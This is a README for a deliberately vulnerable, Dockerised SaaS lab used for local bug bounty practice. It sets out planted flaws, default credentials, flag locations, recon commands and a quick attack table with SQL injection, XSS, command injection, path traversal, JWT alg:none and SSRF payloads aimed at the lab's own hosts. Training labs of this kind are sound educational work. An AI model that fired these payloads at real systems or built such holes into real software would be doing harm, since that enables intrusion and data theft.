# 🛡️ Syntex Lab — Bug Bounty Practice Environment

> **⚠️ FOR LOCAL/LAB USE ONLY**
> This application is **deliberately insecure**. Run it only in an isolated local environment.
> **Never** deploy on a VPS, public IP, college Wi-Fi, office network, or shared LAN.
> By using this lab you confirm you have authorization to test it.

A realistic, intentionally vulnerable corporate SaaS platform for bug bounty practice. Designed to feel like a real HackerOne/Bugcrowd target — not a CTF page.

**Two separate experiences:**
| URL | Purpose |
|-----|---------|
| `http://syntex.local` | Vulnerable target — hunt here |
| `http://program.syntex.local` | Bug bounty platform — report here |

---

## ✨ Features

### Target Website (syntex.local)
- Corporate SaaS portal with real-looking UI
- Login, register, dashboard, profile, products, orders, tickets, blog, search
- File upload, admin panel, support tickets with internal notes
- REST API v1 + v2, GraphQL endpoint with GraphiQL
- WebSocket support chat
- OAuth 2.0 / OIDC simulation
- Race condition modules
- 27 discoverable subdomains via DNS

### Bug Bounty Platform (program.syntex.local)
- HackerOne/Bugcrowd-style program page
- Full scope, rules of engagement, severity guide (P1–P5)
- Report submission with instant flag-based verification
- Triage dashboard: New → Accepted / Duplicate / Informative / N/A / Resolved
- 3-level progressive hint system (29 vulnerabilities covered)
- 5 vulnerability chain missions
- Flag Hunt scoreboard (15 flags)
- Leaderboard + Hall of Fame
- Example reports: Accepted, Duplicate, Informative, N/A
- Mode system: Beginner / Intermediate / Hard / Realistic

### Vulnerability Coverage (57 total)
| Category | Vulnerabilities |
|----------|----------------|
| SQLi | Login, search, product filter, ORDER BY injection, GraphQL |
| XSS | Reflected, Stored (comments, reviews, bio, chat), DOM (URL params) |
| IDOR | Profile, orders, tickets, API v1, GraphQL queries |
| Auth | Bypass via cookie, JWT alg:none, JWT weak secret, OAuth flaws |
| Injection | Command injection (contact form, admin ping, admin execute) |
| SSRF | URL fetch, webhook, avatar, GraphQL field |
| File | Upload bypass (double extension), path traversal, LFI |
| CORS | Reflects any origin with credentials |
| Business Logic | Negative qty, coupon reuse, price manipulation |
| Race Conditions | Wallet, reward claim, coupon parallel requests |
| Recon | .env, .git/config, backup.sql, debug, swagger.json, source maps, actuator |
| OAuth/SSO | Missing state, open redirect, account takeover, role confusion |
| WebSocket | No auth, IDOR on rooms, stored XSS via messages |
| GraphQL | Introspection, IDOR, over-fetching, broken auth mutations |

---

## 🚀 Quick Start

### Requirements
- Docker + Docker Compose
- ~500MB disk space

```bash
# 1. Clone
git clone https://github.com/YOUR_USERNAME/syntex-lab.git
cd syntex-lab

# 2. Launch
# Docker Compose v2 (modern — recommended):
docker compose up --build

# Docker Compose v1 (Kali Linux default / older systems):
docker-compose up --build

# 3. Wait ~30 seconds for seed to complete
# Watch for: [SEED] ✅ Database seeded successfully (v4.1)

# 4. Open the lab
open http://localhost:3000            # Target website
open http://localhost:3000/program   # Bug bounty platform
```

---

## 🌐 Subdomain Setup

Add to `/etc/hosts` (Linux/Mac) or `C:\Windows\System32\drivers\etc\hosts` (Windows):

```
127.0.0.1  syntex.local
127.0.0.1  www.syntex.local
127.0.0.1  api.syntex.local
127.0.0.1  admin.syntex.local
127.0.0.1  dev.syntex.local
127.0.0.1  staging.syntex.local
127.0.0.1  cdn.syntex.local
127.0.0.1  program.syntex.local
127.0.0.1  mail.syntex.local
127.0.0.1  backup.syntex.local
127.0.0.1  vpn.syntex.local
127.0.0.1  intranet.syntex.local
127.0.0.1  git.syntex.local
127.0.0.1  jenkins.syntex.local
127.0.0.1  jira.syntex.local
127.0.0.1  prometheus.syntex.local
127.0.0.1  grafana.syntex.local
127.0.0.1  internal.syntex.local
127.0.0.1  legacy.syntex.local
127.0.0.1  test.syntex.local
127.0.0.1  beta.syntex.local
```

Then access via `http://syntex.local` (port 80 through Nginx).

---

## 🔧 Subdomain Discovery (why subfinder won't work)

`subfinder` uses certificate transparency logs — `.local` domains are **never** in CT logs.
Use these methods instead:

```bash
# Method 1 — ffuf vhost fuzzing (recommended, no DNS needed)
ffuf -u http://127.0.0.1 -H "Host: FUZZ.syntex.local" \
     -w wordlist.txt -mc 200,301,302,403,503 -t 40

# Method 2 — gobuster DNS with lab DNS server
docker compose up dns   # Start lab DNS on 127.0.0.1:5353
gobuster dns -d syntex.local --resolver 127.0.0.1:5353 \
             -w wordlist.txt -t 30

# Method 3 — httpx after finding subdomains
cat found_subs.txt | httpx -status-code -title -tech-detect -web-server -o alive.txt

# Filter interesting responses
grep -E '\[200\]|\[403\]|\[401\]|\[503\]' alive.txt
```

---

## 👤 Default Accounts

| Username | Password | Role | Notable |
|----------|----------|------|---------|
| `admin` | `admin123` | admin | Has FLAG in secret_note |
| `john.doe` | `Password1!` | user | Has FLAG in secret_note |
| `jane.smith` | `letmein123` | user | Engineer account |
| `alice.wong` | `alice2024` | user | Finance account |
| `bob.johnson` | `123456789` | user | Marketing account |
| `developer` | `devpass2024` | developer | DB creds in secret_note |
| `support` | `support123` | support | Support team account |

> All passwords are MD5-hashed in the database (intentional weakness).

---

## 🎯 Difficulty Modes

Change `LAB_MODE` in `docker-compose.yml`, then restart:

```yaml
LAB_MODE: beginner      # Hints, flags, challenges, solutions all visible
LAB_MODE: intermediate  # Hints available, no solutions shown
LAB_MODE: hard          # No hints, no flags in UI
LAB_MODE: realistic     # Program page only — no hints, no flags, no vuln names
```

---

## 🔭 Recon Cheatsheet

```bash
# Phase 1 — Tech fingerprinting
curl -I http://localhost:3000/
# Look for: X-Powered-By, X-Syntex-Version, Server headers

# Phase 2 — Subdomain discovery
ffuf -u http://127.0.0.1 -H "Host: FUZZ.syntex.local" -w wordlist.txt -mc 200,301,302,403,503

# Phase 3 — Directory fuzzing
ffuf -u http://syntex.local/FUZZ -w wordlist.txt -mc 200,301,302,403,500

# Phase 4 — JS analysis
python3 linkfinder.py -i http://syntex.local/js/config.js -o cli
python3 SecretFinder.py -i http://syntex.local/js/internal.js -o cli
# Check: /js/app.bundle.js.map (source map with secrets)

# Phase 5 — API discovery
curl http://syntex.local/swagger.json   | jq .
curl http://syntex.local/openapi.json   | jq .
curl http://syntex.local/api/v1/docs
curl http://syntex.local/_profiler

# Phase 6 — Sensitive file discovery
for f in .env .git/config backup.sql debug config.json phpinfo.php \
          api/v2/internal/config api/v2/users/export; do
  code=$(curl -s -o /dev/null -w "%{http_code}" http://syntex.local/$f)
  echo "$code  /$f"
done

# Phase 7 — GraphQL
curl -X POST http://syntex.local/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name } } }"}'

# Phase 8 — WebSocket
wscat -c "ws://localhost:3000/ws/chat?room=1&username=attacker"
```

---

## ⚡ Quick Attack Reference

| Vulnerability | Command / Payload |
|--------------|------------------|
| SQLi login bypass | `username: admin'--` |
| SQLi UNION dump | `/search?q=' UNION SELECT 1,username,password_hash,4,5 FROM users--` |
| XSS reflected | `/search?q=<script>alert(document.cookie)</script>` |
| DOM XSS | `/?message=<img src=x onerror=alert(1)>` |
| IDOR profile | `/profile/1` (as any user) |
| IDOR API | `curl /api/v1/users/1` (no auth needed) |
| Admin bypass | `document.cookie="role=admin; path=/"` |
| JWT alg:none | Pre-built in `/js/config.js` as `_debug_token` |
| JWT crack | `hashcat -m 0 hashes.txt rockyou.txt` — secret is `secret123` |
| SSRF | `POST /api/v1/fetch` `{"url":"http://localhost:3000/debug"}` |
| Cmd injection | Contact form name: `test; id` |
| Path traversal | `/download?file=../../etc/passwd` |
| .env exposed | `curl http://syntex.local/.env` |
| User export | `curl http://syntex.local/api/v2/users/export` |
| GraphQL IDOR | `{ user(id: 1) { secret_note api_key password_hash } }` |
| Race condition | `for i in $(seq 1 20); do curl -X POST /race/claim-reward & done` |
| Open redirect | `/login?redirect=https://google.com` |

---

## 🚩 Flags

Hidden `FLAG{...}` strings planted at exploitation proof points:

| Slug | Location | Points |
|------|----------|--------|
| `sqli-login` | Admin `secret_note` after login bypass | 250 |
| `idor-profile-admin` | `/api/v1/users/1` → `secret_note` | 200 |
| `idor-profile-user2` | `/profile/2` → `secret_note` | 150 |
| `developer-secrets` | `/profile/6` → `secret_note` (DB creds) | 200 |
| `idor-orders` | `/orders/6` → `notes` field | 150 |
| `idor-tickets` | `/tickets/3` → `internal_notes` | 150 |
| `exposed-env` | `GET /.env` → `LAB_FLAG` field | 100 |
| `debug-page` | `GET /debug` → `lab_flag` field | 100 |
| `internal-config-api` | `GET /api/v2/internal/config` | 200 |
| `mass-user-export` | `GET /api/v2/users/export` | 150 |
| `admin-panel-bypass` | `GET /admin` via cookie=admin | 200 |
| `jwt-algnone` | `/js/config.js` `_debug_token` → `/api/v1/users/me` | 250 |
| `ssrf-internal` | `POST /api/v1/fetch` → internal endpoint | 250 |
| `xss-stored-comments` | Blog comment XSS → console.log | 200 |
| `git-config-token` | `GET /.git/config` → remote URL | 100 |

---

## 🗂️ Architecture

```
syntex-lab/
├── docker-compose.yml          ← All services, localhost-only ports
├── nginx.conf                  ← 27 vhosts (main + program + 25 recon targets)
├── dns/dnsmasq.conf            ← DNS server for tool compatibility
├── wordlist.txt                ← Custom wordlist for ffuf/gobuster
├── README.md
├── SOLUTIONS.md                ← ⚠️ Full spoilers
├── docs/
│   ├── setup.md
│   ├── methodology.md
│   └── walkthroughs/
└── backend/
    ├── server.js               ← Express + HTTP + WebSocket
    ├── database/
    │   ├── init.sql            ← Schema (idempotent)
    │   ├── seed.js             ← Seeder with ON CONFLICT DO NOTHING
    │   └── reset.js            ← Lab reset command
    ├── middleware/
    │   ├── auth.js             ← Weak auth (JWT, rate limit, cookie role)
    │   └── cors.js             ← Reflects any Origin
    ├── routes/
    │   ├── auth.js             ← SQLi login, open redirect, reset
    │   ├── profile.js          ← IDOR, CSRF, XSS
    │   ├── blog.js             ← Stored XSS
    │   ├── products.js         ← SQLi filter/sort
    │   ├── orders.js           ← IDOR, business logic
    │   ├── tickets.js          ← IDOR (internal notes)
    │   ├── search.js           ← SQLi + reflected XSS
    │   ├── contact.js          ← Command injection
    │   ├── upload.js           ← File upload bypass, LFI
    │   ├── admin.js            ← Broken access, cmd injection
    │   ├── misc.js             ← .env, .git, debug, SSRF, LFI
    │   ├── recon.js            ← swagger, openapi, source maps, actuator
    │   ├── graphql.js          ← GraphQL all vulns
    │   ├── websocket.js        ← WebSocket no auth, IDOR, XSS
    │   ├── oauth.js            ← OAuth/SSO flaws
    │   ├── race.js             ← Race conditions
    │   ├── program.js          ← Bug bounty platform routes
    │   ├── hints.js            ← Progressive hint system
    │   ├── challenges.js       ← Vuln chain missions
    │   ├── reports.js          ← Report submission + flag verification
    │   └── api/
    │       ├── v1.js           ← REST API (IDOR, CORS, JWT, SSRF)
    │       └── v2.js           ← Internal API (no auth, full dump)
    └── public/js/
        ├── config.js           ← Leaked API keys, JWT, debug token
        ├── internal.js         ← Leaked routes + service tokens
        └── app.js              ← DOM XSS
```

---

## 🔄 Lab Management

```bash
# Start lab
docker-compose up -d

# Stop lab
docker-compose down

# Fresh start (wipe DB)
docker-compose down -v && docker-compose up --build

# Reset lab data only (keep DB, clear reports/hints/flags)
docker exec syntex_app node database/reset.js

# View logs
docker logs syntex_app -f
docker logs syntex_db  -f

# Connect to database directly
psql -h 127.0.0.1 -U syntex_admin -d syntex_db
# Password: Synx@2024!Prod

# Execute commands in container
docker exec -it syntex_app sh
```

---

## 🔒 Safety

- All ports are bound to `127.0.0.1` (localhost only)
- The lab contains RCE, command injection, SSRF, and file read vulnerabilities
- **Never expose this lab to any network** — treat it like a loaded weapon
- Reset regularly: `docker exec syntex_app node database/reset.js`

---

## 📚 Learning Paths

### Beginner Path
1. Read the scope → `/program/scope`
2. Find exposed files (robots.txt, .env, backup.sql)
3. Test IDOR on `/profile/:id` and `/orders/:id`
4. Find reflected XSS in search
5. Submit your first report → `/program/submit`

### Intermediate Path
1. SQLi on login → dump users via UNION
2. Stored XSS → cookie theft → session hijack
3. JWT alg:none attack via JS config leak
4. SSRF → probe internal network
5. GraphQL introspection → IDOR via query

### Advanced / Realistic Path
1. Full recon: vhost fuzz, JS analysis, source maps
2. Chain: recon → leaked token → admin access
3. Chain: IDOR → API key → GraphQL privilege escalation
4. Race condition: parallel wallet drain
5. Write professional P1 report with CVSS

---

## ⚠️ Disclaimer

This lab is for **educational purposes only**. All vulnerabilities are intentional.
Do not use techniques practiced here against any system you do not own or have explicit written permission to test.

**Hack the planet — legally.** 🌍
